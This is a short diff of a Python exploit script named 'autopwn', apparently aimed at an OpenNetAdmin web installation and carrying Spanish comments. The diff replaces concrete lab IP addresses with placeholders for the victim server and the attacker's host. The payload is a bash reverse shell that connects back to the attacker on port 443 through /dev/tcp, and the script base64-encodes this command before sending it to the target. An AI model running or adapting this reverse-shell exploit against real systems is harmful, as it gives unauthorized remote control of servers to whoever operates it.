@@ -70,7 +70,7 @@ class Exploit:
             p1.failure(str(e))
 
 
-autopwn = Exploit("http://192.168.1.139/ona/", "sh -i >& /dev/tcp/192.168.1.136/443 0>&1")
+autopwn = Exploit("http://[IP Servidor]/ona/", "sh -i >& /dev/tcp/[Vuestra IP]/443 0>&1")
                           # ↑ Cambiar IP (Victim)                   ↑ Cambiar IP (Host)
 def main():
     autopwn.base64encode()
